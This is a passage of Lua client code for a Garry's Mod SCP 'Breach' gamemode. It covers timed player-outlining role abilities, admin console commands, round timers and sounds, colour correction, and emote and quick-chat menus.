            local elapsed = CurTime() - VisorData.StartTime
            local timeLeft = VisorData.Duration - elapsed

            
            if timeLeft <= 0 then
                surface.PlaySound("items/nvg_off.wav")
                hook.Remove( "PreDrawOutlines", "DrawTargets" )
                hook.Remove( "HUDPaint", "TacticalVisor_HUD_Targets" )
                client.TargetsTable = nil
                VisorData.Active = false
                return
            end

            
            local alphaMulti = 1
            if elapsed < 1 then alphaMulti = elapsed
            elseif timeLeft < 2 then alphaMulti = timeLeft / 2 end

            
            
            
            
            
            

            
            local pulse = (math.sin(CurTime() * 8) + 1) / 2
            local finalAlpha = (150 + 105 * pulse) * alphaMulti

            if VisorData.GlitchIntensity > 0.5 then
                finalAlpha = finalAlpha * math.random(0.1, 0.5)
            end

            local to_draw = {}
            local drawColor = Color(clr_to_draw.r, clr_to_draw.g, clr_to_draw.b, finalAlpha)

            
            for i = #client.TargetsTable, 1, -1 do
                local target = client.TargetsTable[ i ]

                if ( IsValid(target) and target:Health() > 0 and 
                    ( (not universal_search and target:GTeam() == team_indx) or (universal_search and universal_search[target:GTeam()]) ) and 
                    not target:GetRoleName():find("Spy") ) then

                    if ( not target:GetUsingCloth() or not target:GetUsingCloth():find("hazmat") ) then
                        to_draw[ #to_draw + 1 ] = target
                        
                        
                        local bonemerged = ents.FindByClassAndParent("ent_bonemerged", target)
                        if bonemerged then
                            for b = 1, #bonemerged do
                                to_draw[ #to_draw + 1 ] = bonemerged[b]
                            end
                        end
                    end
                else
                    table.remove( client.TargetsTable, i )
                end
            end

            
            
            
        end )

        
        
        
        hook.Add("HUDPaint", "TacticalVisor_HUD_Targets", function()
            if not VisorData.Active or not client.TargetsTable then return end

            local elapsed = CurTime() - VisorData.StartTime
            local timeLeft = VisorData.Duration - elapsed
            
            if timeLeft <= 0 then return end

            local alphaMulti = 1
            if elapsed < 1 then alphaMulti = elapsed
            elseif timeLeft < 2 then alphaMulti = timeLeft / 2 end

            
            
            
            
            
            
            

            
            for i = 1, #client.TargetsTable do
                local target = client.TargetsTable[i]
                
                if IsValid(target) and target:Alive() and (not target:GetUsingCloth() or not target:GetUsingCloth():find("hazmat")) then
                    local pos = target:GetPos() + Vector(0, 0, 45) 
                    local scr = pos:ToScreen()

                    if scr.visible then
                        local dist = math.Round(client:GetPos():Distance(target:GetPos()) * 0.019)
                        
                        local gx = (VisorData.GlitchIntensity > 0.5) and math.random(-5, 5) or 0
                        local gy = (VisorData.GlitchIntensity > 0.5) and math.random(-3, 3) or 0
                        
                        local boxSize = 25
                        local a = 200 * alphaMulti

                        local function DrawBrackets(x, y, size, clr)
                            surface.SetDrawColor(clr)
                            local len = 8
                            surface.DrawLine(x - size, y - size, x - size + len, y - size)
                            surface.DrawLine(x - size, y - size, x - size, y + size)
                            surface.DrawLine(x - size, y + size, x - size + len, y + size)
                            surface.DrawLine(x + size, y - size, x + size - len, y - size)
                            surface.DrawLine(x + size, y - size, x + size, y + size)
                            surface.DrawLine(x + size, y + size, x + size - len, y + size)
                        end

                        
                        if VisorData.GlitchIntensity > 0.4 then
                            DrawBrackets(scr.x + gx, scr.y + gy, boxSize, ColorAlpha(color_glitch_r, a))
                            DrawBrackets(scr.x - gx, scr.y - gy, boxSize, ColorAlpha(color_glitch_b, a))
                        end

                        
                        DrawBrackets(scr.x, scr.y, boxSize, ColorAlpha(clr_to_draw, a))

                        
                        local txtAlpha = a * (math.random() > 0.8 and 0.5 or 1)
                        draw.SimpleTextOutlined("Цель", "MM_SmallName", scr.x + boxSize + 5 + gx, scr.y - 10, ColorAlpha(clr_to_draw, txtAlpha), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color(0,0,0, txtAlpha))
                        draw.SimpleTextOutlined(dist .. "Метров", "MM_SmallName", scr.x + boxSize + 5 - gx, scr.y + 10, Color(200, 200, 200, txtAlpha), TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color(0,0,0, txtAlpha))
                    end
                end
            end

            
            
            
            
        end)

    else
        
        for i = 1, #target_list do
            client.TargetsTable[ #client.TargetsTable + 1 ] = target_list[i]
        end
    end

end )

local radio_green = Color( 0, 180, 0, 210 )

net.Receive( "fbi_commanderabillity", function()

  local client = LocalPlayer()

  if ( client:GetRoleName() != role.UIU_Agent_Commander and client:GetRoleName() != role.UIU_Commander ) then return end

  hook.Add( "PreDrawOutlines", "DrawPeopleWithRadios", function()

    local to_draw = {}

    if ( client:Health() <= 0 ) then

      hook.Remove( "PreDrawOutlines", "DrawPeopleWithRadios" )

      return
    end

    local players = player.GetAll()

    for i = 1, #players do

      local player = players[ i ]

      if ( player:IsSolid() ) then

        local radio = player:GetWeapon( "item_radio" )

        if ( radio && radio:IsValid() && radio.GetEnabled && radio:GetEnabled() && player:GTeam() != client:GTeam() ) then

          to_draw[ #to_draw + 1 ] = player

        end

      end

    end

    outline.Add( to_draw, radio_green, 0 )

  end )

  timer.Simple( 15, function()

    hook.Remove( "PreDrawOutlines", "DrawPeopleWithRadios" )

  end )

end )

local class_d_color = Color(255, 130, 0)

net.Receive( "Chaos_SpyAbility", function()

    local client = LocalPlayer()

    if ( client:GetRoleName() != role.SECURITY_Spy ) then return end

    hook.Add( "PreDrawOutlines", "DrawClassds", function()

        local to_draw = {}

        if ( !client:Alive() ) then

            hook.Remove( "PreDrawOutlines", "DrawClassds" )

            return
        end

        for _, v in ipairs( ents.FindInSphere( client:GetPos(), 300 ) ) do

            if ( v:IsPlayer() && v:GTeam() == TEAM_CLASSD && v:Health() > 0 ) then

                to_draw[ #to_draw + 1 ] = v

                for _, bnmrg in ipairs(v:LookupBonemerges()) do
                	to_draw[ #to_draw + 1 ] = bnmrg
                end

            end

        end

        outline.Add( to_draw, class_d_color, 2 )

    end )

    timer.Simple( 10, function()

        hook.Remove( "PreDrawOutlines", "DrawClassds" )

    end )

end )

net.Receive( "Cult_SpecialistAbility", function()

    local client = LocalPlayer()

    if ( client:GetRoleName() != role.Cult_Specialist ) then return end

    hook.Add( "PreDrawOutlines", "DrawCultTargets", function()

        local to_draw = {}

        if ( !client:Alive() ) then

            hook.Remove( "PreDrawOutlines", "DrawCultTargets" )

            return
        end

        for _, v in ipairs( ents.FindInSphere( client:GetPos(), 3000 ) ) do

            if ( v:IsPlayer() && v:GTeam() != TEAM_SPEC && v:Health() > 0 ) then

                to_draw[ #to_draw + 1 ] = v

            end

        end

        outline.Add( to_draw, Color(255,0,0), 0 )

    end )

    timer.Simple( 20, function()

        hook.Remove( "PreDrawOutlines", "DrawCultTargets" )

    end )

end )



function DropCurrentVest()
	if LocalPlayer():Alive() and LocalPlayer():GTeam() != TEAM_SPEC then
		net.Start("DropCurrentVest")
		net.SendToServer()
	end
end

concommand.Add( "br_spectate", function( ply, cmd, args )
	net.Start("SpectateMode")
	net.SendToServer()
end )

concommand.Add( "br_dropuniform", function( ply, cmd, args )
	DropCurrentVest()
end )

concommand.Add( "br_recheck_premium", function( ply, cmd, args )
	if ply:IsSuperAdmin() then
		net.Start("RecheckPremium")
		net.SendToServer()
	end
end )

concommand.Add( "br_roundrestart_cl", function( ply, cmd, args )
	if ply:IsSuperAdmin() then
		net.Start("RoundRestart")
		net.SendToServer()
	end
end )

wantClear = false
tUse = 0

concommand.Add( "br_clear_stats", function( ply, cmd, args )
	if ply:IsSuperAdmin() then
		if tUse < CurTime() and wantClear then wantClear = false  end
		if #args > 0 then
			
			net.Start( "ClearData" )
				net.WriteString( tostring( args[1] ) )
			net.SendToServer()
		else
			if !wantClear then
				
				wantClear = true
				tUse = CurTime() + 10
			else
				wantClear = false
				
				net.Start( "ClearData" )
					net.WriteString( "&ALL" )
				net.SendToServer()
			end
		end
	end
end )

concommand.Add( "br_restart_game", function( ply, cmd, args )
	if ply:IsSuperAdmin() then
		net.Start("Restart")
		net.SendToServer()
	end
end )

concommand.Add( "br_admin_mode", function( ply, cmd, args )
	if ply:IsSuperAdmin() then
		net.Start("AdminMode")
		net.SendToServer()
	end
end )

concommand.Add( "br_disableallhud", function( ply, cmd, args )
	disablehud = !disablehud
end )

concommand.Add( "br_livecolors", function( ply, cmd, args )
	if livecolors then
		livecolors = false
		chat.AddText("livecolors disabled")
	else
		livecolors = true
		chat.AddText("livecolors enabled")
	end
end )

gamestarted = gamestarted || false
cltime = cltime || 0
drawinfodelete = drawinfodelete || 0
shoulddrawinfo = shoulddrawinfo || false
drawendmsg = drawendmsg || nil
timefromround = timefromround || 0










function OnUseEyedrops(ply) end

eyedropeffect = eyedropeffect || 0
function EyeDrops(ply, type)
	local time = 10
	if type == 2 then time = 30 end
	if type == 3 then time = 50 end

	eyedropeffect = CurTime() + time
end

function StartTime()
	timer.Destroy("UpdateTime")
	timer.Create("UpdateTime", 1, 0, function()
		if cltime > 0 then
			cltime = cltime - 1
		end
	end)
end

endinformation = {}

net.Receive( "UpdateTime", function( len )
	cltime = tonumber(net.ReadString())
	StartTime()
end)

net.Receive( "OnEscaped", function( len )
	local nri = net.ReadInt(4)
	shoulddrawescape = nri
	esctime = CurTime() - timefromround
	lastescapegot = CurTime() + 20
end)

net.Receive( "ForcePlaySound", function( len )
	local sound = net.ReadString()
	surface.PlaySound(sound)
end)

net.Receive( "EfficientPlaySound", function( len )
	local snd = Sound(net.ReadString())
	local customparameters = net.ReadTable() || {}
	local sndpatch = CreateSound(game.GetWorld(), snd)
	if customparameters.dsp then
		sndpatch:SetDSP(customparameters.dsp)
	end
	if customparameters.volume then
		sndpatch:ChangeVolume(customparameters.volume)
	end
	if customparameters.pitch then
		sndpatch:ChangePitch(customparameters.pitch)
	end
	sndpatch:Play()
	if customparameters.dietime then
		timer.Simple(customparameters.dietime, function()
			sndpatch:Stop()
		end)
	end
end)

net.Receive("PrepClient", function(len)
	GAMEMODE:ScoreboardHide() 
	RunConsoleCommand("stopsound")
	RunConsoleCommand("mp_show_voice_icons", "0")

	Monitors_Activated = 0

	

	local client = LocalPlayer()
	client.no_signal = nil
	client:ConCommand( "pp_mat_overlay \"\"" )
	client:ConCommand( "lounge_chat_clear" )

	client.BlackScreen = true

	timer.Simple( 5, function()
		client.BlackScreen = nil
	end)
end)

net.Receive( "UpdateRoundType", function( len )
	roundtype = net.ReadString()
	
end)

net.Receive( "SendRoundInfo", function( len )
	local infos = net.ReadTable()
	endinformation = {
		string.Replace( clang.lang_pldied, "{num}", infos.deaths ),
		string.Replace( clang.lang_descaped, "{num}", infos.descaped ),
		string.Replace( clang.lang_sescaped, "{num}", infos.sescaped ),
		string.Replace( clang.lang_rescaped, "{num}", infos.rescaped ),
		string.Replace( clang.lang_dcaptured, "{num}", infos.dcaptured ),
		string.Replace( clang.lang_rescorted, "{num}", infos.rescorted ),
		string.Replace( clang.lang_teleported, "{num}", infos.teleported ),
		string.Replace( clang.lang_snapped, "{num}", infos.snapped ),
		string.Replace( clang.lang_zombies, "{num}", infos.zombies )
	}
	if infos.secretf == true then
		table.ForceInsert(endinformation, clang.lang_secret_found)
	else
		table.ForceInsert(endinformation, clang.lang_secret_nfound)
	end
end)

net.Receive( "RolesSelected", function( len )
	drawinfodelete = CurTime() + 25
	shoulddrawinfo = true

	local client = LocalPlayer()

	
		if client:GetRoleName() == "GOC Spy" then
			hook.Add("HUDPaint", "GOC_Spy_Uniform", function()
				if client:GetRoleName() != "GOC Spy" then
					hook.Remove("HUDPaint", "GOC_Spy_Uniform")
					return
				end
				local Ents = ents.FindByClass("armor_goc")
				local tab = {}
				for i = 1, #Ents do
					local ent = Ents[i]
					if ent:GetPos():DistToSqr(client:GetPos()) > 136222 then continue end
					tab[#tab + 1] = ent
				end
				outline.Add( tab, Color(255,0,0), OUTLINE_MODE_BOTH )
			end)
		end
	
end)

BREACH.MutedFags = {}

gameevent.Listen("player_spawn")
hook.Add("player_spawn", "RememberMutedFags", function(data) 
	local id = data.userid
	if LocalPlayer():UserID() == id then
		for k, v in pairs(BREACH.MutedFags) do
			if !IsValid(v) then
				table.remove(BREACH.MutedFags, k)
			end
		end
		if LocalPlayer():GTeam() == TEAM_SPEC then
			for k, v in pairs(BREACH.MutedFags) do
				if !IsValid(v) then continue end
				v:SetMuted(true)
			end
		else
			for k, v in player.Iterator() do
				if v:IsMuted() then
					table.insert(BREACH.MutedFags, v)
					v:SetMuted(false)
				end
			end
		end
	end
end)

timer.Create("Breach:ClientsideMuteCheck", 1, 0, function()
	for k, v in player.Iterator() do
		if !v:IsMuted() and table.HasValue(BREACH.MutedFags, v) then
			for _, sdidsa in pairs(BREACH.MutedFags) do
				if !IsValid(sdidsa) then
					table.remove(BREACH.MutedFags, _)
				end

				if sdidsa == v then
					table.remove(BREACH.MutedFags, k)
					v:SetMuted(false)
				end
			end
		end
	end
end)

net.Receive( "PrepStart", function( len )
	GAMEMODE:ScoreboardHide() 
	RunConsoleCommand("stopsound")
	cltime = net.ReadInt(8)
	postround = false
	preparing = true
	BREACH.Round.GeneratorsActivated = true
	StartTime()
	drawendmsg = nil
	timer.Destroy("StartIntroMusic")
	timer.Create("StartIntroMusic", 1, 1, StartIntroMusic)
	timer.Destroy("IntroSound")
	if LocalPlayer():GTeam() != TEAM_GUARD and LocalPlayer():GTeam() != TEAM_AMERICA and LocalPlayer():GTeam() != TEAM_NAZI and LocalPlayer():GTeam() != TEAM_COMBINE and LocalPlayer():GTeam() != TEAM_RESISTANCE and LocalPlayer():GTeam() != TEAM_FURRY and LocalPlayer():GTeam() != TEAM_ANTIFURRY then
		timer.Create("IntroSound", 55, 1, IntroSound)
		if math.random(0,1) == 1 then
			timer.Simple(math.random(1,25),function()
				surface.PlaySound("Ambient/Pre-breach/Ambient"..math.random(0,4)..".ogg")	
			end)
		end
		if math.random(0,1) == 1 then
			timer.Simple(math.random(25,45),function()
				surface.PlaySound("Ambient/Pre-breach/Ambient"..math.random(0,4)..".ogg")	
			end)
		end
		if LocalPlayer():GTeam() == TEAM_CLASSD then
			
			
			
		
		
		
		
		end
	end
	if LocalPlayer():GTeam() == TEAM_NAZI then
		timer.Simple(3,function()
			surface.PlaySound("nextoren/nazi_spawn.wav")	
		end)
	end
	if LocalPlayer():GTeam() == TEAM_USA then
		timer.Simple(3,function()
			surface.PlaySound("nextoren/usa_spawn.wav")	
		end)
	end
	if LocalPlayer():GTeam() == TEAM_COMBINE then
		timer.Simple(3,function()
			surface.PlaySound("nextoren/cmb_spawn.wav")	
		end)
	end
	if LocalPlayer():GTeam() == TEAM_RESISTANCE then
		timer.Simple(3,function()
			surface.PlaySound("nextoren/gf_spawn.wav")	
		end)
	end
	timefromround = CurTime() + 10
	RADIO4SOUNDS = table.Copy(RADIO4SOUNDSHC)
	if LocalPlayer():GTeam() == TEAM_GUARD then
		LocalPlayer():ScreenFade(SCREENFADE.IN, color_black, 1, 5)
		LocalPlayer().cantopeninventory = true
		hook.Add("HUDShouldDraw", "MTF_HIDEHUD", function()
			if LocalPlayer():GTeam() == TEAM_GUARD then
				return false
			else
				LocalPlayer().cantopeninventory = nil
				hook.Remove("HUDShouldDraw", "MTF_HIDEHUD")
			end
		end)
	end
	if LocalPlayer():GTeam() == TEAM_SCI or LocalPlayer():GTeam() == TEAM_SPECIAL or LocalPlayer():GTeam() == TEAM_DZ then
		LocalPlayer():ScreenFade(SCREENFADE.IN, color_black, 1, 5)
		LocalPlayer().cantopeninventory = true
		--LocalPlayer().exhausted = true
		--exhausted_cd = CurTime() + 60
		timer.Simple(60, function()
			LocalPlayer().cantopeninventory = nil
		end)
	end
	timer.Destroy("IntroStart")
	timer.Create("IntroStart", 66, 1, function()
		BREACH.Round.GeneratorsActivated = false
	end)
	if !GetGlobalBool("FurryRound") then
	tab = {
		["$pp_colour_addr"] = 0,
		["$pp_colour_addg"] = 0,
		["$pp_colour_addb"] = 0,
		["$pp_colour_brightness"] = 1,
		["$pp_colour_contrast"] = 1,
		["$pp_colour_colour"] = 1,
		["$pp_colour_mulr"] = 0,
		["$pp_colour_mulg"] = 0,
		["$pp_colour_mulb"] = 0
	}

	DrawColorModify( tab )
	else
		local client = LocalPlayer()

		tab2 = {
			["$pp_colour_addr"] = 0,
			["$pp_colour_addg"] = 0,
			["$pp_colour_addb"] = 0,
			["$pp_colour_brightness"] = -0.06,
			["$pp_colour_contrast"] = 0.6,
			["$pp_colour_colour"] = 1,
			["$pp_colour_mulr"] = 0,
			["$pp_colour_mulg"] = 0,
			["$pp_colour_mulb"] = 0
		}

		DrawColorModify( tab2 )
	end
	timer.Destroy("IntroEnd")
	local prep_end = 60
	if GetGlobalBool("FurryRound") then
		prep_end = 1
	end
	timer.Create("IntroEnd", prep_end, 1, function()
		local client = LocalPlayer()
		local tab2
		if client:GTeam() != TEAM_SCP then
			if OUTSIDE_BUFF and OUTSIDE_BUFF( client:GetPos() ) then

				tab2 = {
					["$pp_colour_addr"] = 0,
					["$pp_colour_addg"] = 0,
					["$pp_colour_addb"] = 0,
					["$pp_colour_brightness"] = 0,
					["$pp_colour_contrast"] = 1,
					["$pp_colour_colour"] = 1,
					["$pp_colour_mulr"] = 0,
					["$pp_colour_mulg"] = 0,
					["$pp_colour_mulb"] = 0
				}
			else
				tab2 = {
					["$pp_colour_addr"] = 0,
					["$pp_colour_addg"] = 0,
					["$pp_colour_addb"] = 0,
					["$pp_colour_brightness"] = -0.06,
					["$pp_colour_contrast"] = 0.6,
					["$pp_colour_colour"] = 1,
					["$pp_colour_mulr"] = 0,
					["$pp_colour_mulg"] = 0,
					["$pp_colour_mulb"] = 0
				}
			end
		else
			tab2 = {
				["$pp_colour_addr"] = 0.15,
				["$pp_colour_addg"] = 0,
				["$pp_colour_addb"] = 0,
				["$pp_colour_brightness"] = -0.005,
				["$pp_colour_contrast"] = 1,
				["$pp_colour_colour"] = 1,
				["$pp_colour_mulr"] = 0,
				["$pp_colour_mulg"] = 0,
				["$pp_colour_mulb"] = 0
			}
		end
		DrawColorModify( tab2 )
	end)
end)

net.Receive( "RoundStart", function( len )
	preparing = false
	cltime = net.ReadInt(12)
	StartTime()
	drawendmsg = nil
end)

net.Receive( "PostStart", function( len )
	postround = true
	cltime = net.ReadInt(6)
	win = net.ReadInt(4)
	drawendmsg = win
	StartTime()
end)

net.Receive( "TranslatedMessage", function( len )
	local msg = net.ReadString()
	//local center = net.ReadBool()

	//print( msg )
	local color = nil
	local nmsg, cr, cg, cb = string.match( msg, "(.+)%#(%d+)%,(%d+)%,(%d+)$" )
	if nmsg and cr and cg and cb then
		msg = nmsg
		color = Color( cr, cg, cb )
	end

	local name, func = string.match( msg, "^(.+)%$(.+)" )
	
	if name and func then
		local args = {}

		for v in string.gmatch( func, "%w+" ) do
			table.insert( args, v )
			//print( "splitted:", v )
		end

		local translated = clang.NRegistry[name] or string.format( clang.NFailed, name )
		if color then
			chat.AddText( color, string.format( translated, unpack( args ) ) )
		else
			chat.AddText( string.format( translated, unpack( args ) ) )
		end
	else
		local translated = clang.NRegistry[msg] or string.format( clang.NFailed, msg )
		if color then
			chat.AddText( color, translated )
		else
			chat.AddText( translated )
		end
	end
end )

local gradients = Material("gui/center_gradient")

local rust_bg       = Color(18, 16, 15, 240)
local rust_panel    = Color(30, 28, 25, 255)
local rust_outline  = Color(255, 255, 255, 10)
local rust_green    = Color(112, 126, 73)
local rust_yellow   = Color(218, 165, 32)
local rust_text     = Color(230, 230, 230)
local rust_dim      = Color(140, 140, 140)

function CreateEmoteMenu()

    if IsValid(BREACH.EMOTECOOLMENU) then
        if not BREACH.EMOTECOOLMENU.IsDying then
            BREACH.EMOTECOOLMENU.IsDying = true
        end
        return
    end

    local num = #BREACH.EMOTES

    local headerH = ScrH() * 0.035
    local rowH = ScrH() * 0.035
    local pnlW = ScrW() * 0.18
    local pnlH = headerH + (num * rowH) + 25

    BREACH.EMOTECOOLMENU = vgui.Create("DPanel")
    local pnl = BREACH.EMOTECOOLMENU
    pnl:SetSize(pnlW, pnlH)

    pnl.TargetX = ScrW() * 0.015
    pnl.CurX = -pnlW
    pnl:SetPos(pnl.CurX, ScrH() * 0.3)
    pnl.CurAlpha = 0
    pnl.IsDying = false

    pnl.Think = function(self)
        local ft = FrameTime() * 15
        
        if self.IsDying then
            self.CurX = Lerp(ft, self.CurX, -pnlW)
            self.CurAlpha = Lerp(ft * 1.5, self.CurAlpha, 0)
            if self.CurAlpha < 5 then
                self:Remove()
            end
        else
            self.CurX = Lerp(ft, self.CurX, self.TargetX)
            self.CurAlpha = Lerp(ft, self.CurAlpha, 255)
        end
        
        self:SetPos(math.Round(self.CurX), self:GetY())
        self:SetAlpha(self.CurAlpha)
    end

    pnl.Paint = function(self, w, h)
        if DrawBlurPanel then DrawBlurPanel(self, 3) end
        
        surface.SetDrawColor(rust_bg)
        surface.DrawRect(0, 0, w, h)

        surface.SetDrawColor(rust_panel)
        surface.DrawRect(0, 0, w, headerH)

        surface.SetDrawColor(rust_yellow)
        surface.DrawRect(0, headerH - 2, w, 2)

        draw.SimpleText(L("l:emotes_title"), "MM_Exp", 15, headerH/2 - 1, color_white, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

        surface.SetDrawColor(rust_outline)
        surface.DrawOutlinedRect(0, 0, w, h, 1)
        
        surface.SetDrawColor(0, 0, 0, 150)
        surface.DrawRect(0, h - 25, w, 25)
        draw.SimpleText(L("l:emotes_hint"), "MM_SmallName", w/2, h - 12, rust_dim, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local btnContainer = vgui.Create("DPanel", pnl)
    btnContainer:SetPos(0, headerH)
    btnContainer:SetSize(pnlW, num * rowH)
    btnContainer.Paint = function() end

    for i, v in ipairs(BREACH.EMOTES) do
        local button = vgui.Create("DButton", btnContainer)
        button:Dock(TOP)
        button:SetSize(0, rowH)
        button:SetText("")
        
        button.name = v.name
        button.num = i
        
        local keyName = (i == 10) and "KEY_0" or "KEY_"..tostring(i)
        local keyEnum = _G[keyName]
        
        button.wasDown = keyEnum and input.IsKeyDown(keyEnum) or false

        button.DoClick = function(btn)
            LocalPlayer():ConCommand("br_emote " .. btn.num)
            if IsValid(pnl) then pnl.IsDying = true end
        end

        button.Think = function(btn)
            if pnl.IsDying then return end
            if not keyEnum then return end
            
            local isDown = input.IsKeyDown(keyEnum)
            if isDown and not btn.wasDown then
                btn:DoClick()
            end
            btn.wasDown = isDown
        end

        button.Paint = function(btn, w, h)
            local isHovered = btn:IsHovered()

            if isHovered then
                surface.SetDrawColor(255, 255, 255, 10)
                surface.DrawRect(0, 0, w, h)
            end

            surface.SetDrawColor(isHovered and rust_yellow or Color(60, 60, 60, 255))
            surface.DrawRect(0, 0, 3, h)

            local numDisplay = (btn.num == 10) and 0 or btn.num
            draw.SimpleText("[ " .. numDisplay .. " ]", "MM_Exp", 20, h/2 - 1, isHovered and rust_yellow or rust_dim, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

            local txtColor = isHovered and color_white or rust_text
            local translatedName = (L and L(btn.name)) or btn.name
            draw.SimpleText(string.upper(translatedName), "MM_Exp", 55, h/2 - 1, txtColor, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

            surface.SetDrawColor(rust_outline)
            surface.DrawLine(0, h - 1, w, h - 1)
        end
    end
end


concommand.Add( "br_emote", function( ply, cmd, args )
    
    
	
	net.Start("Breach:Emotes")
	net.WriteInt(args[1],8)
	net.SendToServer()
end )

BREACH.QuickChatPhrases = {
	{name = "l:quickchat_request_id", phrase = "quickchat_request_id", military_only = true, boy = "cmenu/boyfix/1.mp3", fem = "cmenu/fem/7.wav", femboy = {"cmenu/femboyfix/1_1.mp3", "cmenu/femboyfix/1_2.mp3"}},
	{name = "l:quickchat_take_off_suit", phrase = "quickchat_take_off_suit", military_only = true, boy = "cmenu/boyfix/2.mp3", fem = "cmenu/fem/8.wav", femboy = {"cmenu/femboyfix/2_1.mp3", "cmenu/femboyfix/2_2.mp3"}},
	{name = "l:quickchat_put_weapon_away", phrase = "quickchat_put_weapon_away", military_only = true, boy = "cmenu/boyfix/3.mp3", fem = "cmenu/fem/9.wav", femboy = {"cmenu/femboyfix/3_1.mp3", "cmenu/femboyfix/3_2.mp3"}},
	{name = "l:quickchat_drop_the_weapon", phrase = "quickchat_drop_the_weapon", military_only = true, boy = "cmenu/boyfix/4.mp3", fem = "cmenu/fem/10.wav", femboy = {"cmenu/femboyfix/4_1.mp3", "cmenu/femboyfix/4_2.mp3"}},
	{name = "l:quickchat_friendly", phrase = "quickchat_friendly", boy = "cmenu/boyfix/5.mp3", fem = "cmenu/fem/1.wav", femboy = {"cmenu/femboyfix/5_1.mp3", "cmenu/femboyfix/5_2.mp3", "cmenu/femboyfix/5_3.mp3"}},
	{name = "l:quickchat_run", phrase = "quickchat_run", boy = "cmenu/boyfix/6.mp3", fem = "cmenu/fem/2.wav", femboy = {"cmenu/femboyfix/6_1.mp3", "cmenu/femboyfix/6_2.mp3", "cmenu/femboyfix/6_3.mp3"}},
	{name = "l:quickchat_enemy_spotted", phrase = "quickchat_enemy_spotted", boy = "cmenu/boyfix/7.mp3", fem = "cmenu/fem/3_new.wav", femboy = {"cmenu/femboyfix/7_1.mp3", "cmenu/femboyfix/7_2.mp3", "cmenu/femboyfix/7_3.mp3"}},
	{name = "l:quickchat_scp_spotted", phrase = "quickchat_scp_spotted", boy = "cmenu/boyfix/8.mp3", fem = "cmenu/fem/4.wav", femboy = {"cmenu/femboyfix/8_1.mp3", "cmenu/femboyfix/8_2.mp3"}},
	{name = "l:quickchat_stop", phrase = "quickchat_stop", military_only = true, boy = "cmenu/boyfix/9.mp3", fem = "cmenu/fem/11.wav", femboy = {"cmenu/femboyfix/9_1.mp3", "cmenu/femboyfix/9_2.mp3"}},
	{name = "l:quickchat_face_the_wall", phrase = "quickchat_face_the_wall", military_only = true, boy = "cmenu/boyfix/10.mp3", fem = "cmenu/fem/12.wav", femboy = {"cmenu/femboyfix/10_1.mp3", "cmenu/femboyfix/10_2.mp3"}},
	{name = "l:quickchat_dont_follow_me", phrase = "quickchat_dont_follow_me", boy = "cmenu/boyfix/11.mp3", fem = "cmenu/fem/5.wav", femboy = {"cmenu/femboyfix/11_1.mp3", "cmenu/femboyfix/11_2.mp3"}},
	{name = "l:quickchat_dont_approach", phrase = "quickchat_dont_approach", boy = "cmenu/boyfix/11.mp3", fem = "cmenu/fem/6.wav", femboy = {"cmenu/femboyfix/12_1.mp3", "cmenu/femboyfix/12_2.mp3"}},
}

BREACH.CombineVoices = {
	"prison_soldier_boomersinbound",
	"prison_soldier_containd8",
	"prison_soldier_fallback_b4",
	"prison_soldier_freeman_antlions",
	"prison_soldier_fullbioticoverrun",
	"prison_soldier_negativecontainment",
	"prison_soldier_prosecuted7",
	"prison_soldier_sundown3dead",
	"prison_soldier_visceratorsa5"
}

BREACH.QuickChatPhrases_RoleWhitelist = {
	["Head of Personnel"] = true,
}

BREACH.QuickChatPhrases_RoleBlacklist = {
	["GOC Spy"] = true,
	["UIU Spy"] = true,
	["SH Spy"] = true,
}

BREACH.QuickChatMenu_PageToDraw = 0
BREACH.QuickChatMenu_Pages = 0

local rust_bg       = Color(18, 16, 15, 240)
local rust_panel    = Color(30, 28, 25, 255)
local rust_outline  = Color(255, 255, 255, 10)
local rust_green    = Color(112, 126, 73)
local rust_yellow   = Color(218, 165, 32)
local rust_text     = Color(230, 230, 230)
local rust_dim      = Color(140, 140, 140)

function BREACH.QuickChatMenu()
    local ply = LocalPlayer()
    
    if (BREACH.QuickChatNextPageTime or 0) > CurTime() then return end
    BREACH.QuickChatNextPageTime = CurTime() + 0.2 

    if IsValid(BREACH.QuickChatPanel) then
        if BREACH.QuickChatMenu_PageToDraw < BREACH.QuickChatMenu_Pages then
            BREACH.QuickChatMenu_PageToDraw = BREACH.QuickChatMenu_PageToDraw + 1
            BREACH.QuickChatPanel:RebuildButtons()
            return
        else
            BREACH.QuickChatPanel.IsDying = true
            return
        end 
    end

    local valid_phrases = {}
    for _, v in pairs(BREACH.QuickChatPhrases or {}) do
        local skip = false
        if v.military_only and (BREACH.QuickChatPhrases_NonMilitaryTeams[ply:GTeam()] or BREACH.QuickChatPhrases_RoleBlacklist[ply:GetRoleName()]) then
            if not BREACH.QuickChatPhrases_RoleWhitelist[ply:GetRoleName()] then
                skip = true
            end
        end
        
        if not skip then
            table.insert(valid_phrases, v)
        end
    end

    BREACH.QuickChatMenu_Pages = math.max(0, math.floor((#valid_phrases - 1) / 5))
    local phrases_copy = {}
    
    for i, v in ipairs(valid_phrases) do
        local copy = table.Copy(v)
        copy.page = math.floor((i - 1) / 5)
        copy.key = ((i - 1) % 5) + 1
        table.insert(phrases_copy, copy)
    end

    local headerH = ScrH() * 0.035
    local rowH = ScrH() * 0.035
    local maxRows = (BREACH.QuickChatMenu_Pages > 0) and 5 or #phrases_copy
    local pnlW = ScrW() * 0.18
    local pnlH = headerH + (maxRows * rowH) + 25

    BREACH.QuickChatPanel = vgui.Create("DPanel")
    local pnl = BREACH.QuickChatPanel
    pnl:SetSize(pnlW, pnlH)
    
    pnl.TargetX = ScrW() * 0.015
    pnl.CurX = -pnlW
    pnl:SetPos(pnl.CurX, ScrH() * 0.3)
    pnl.CurAlpha = 0
    pnl.IsDying = false

    pnl.BtnContainer = vgui.Create("DPanel", pnl)
    pnl.BtnContainer:SetPos(0, headerH)
    pnl.BtnContainer:SetSize(pnlW, maxRows * rowH)
    pnl.BtnContainer.Paint = function() end


    pnl.Think = function(self)
        local ft = FrameTime() * 15
        
        if self.IsDying then
            self.CurX = Lerp(ft, self.CurX, -pnlW)
            self.CurAlpha = Lerp(ft * 1.5, self.CurAlpha, 0)
            if self.CurAlpha < 5 then
                self:Remove()
            end
        else
            self.CurX = Lerp(ft, self.CurX, self.TargetX)
            self.CurAlpha = Lerp(ft, self.CurAlpha, 255)
        end
        
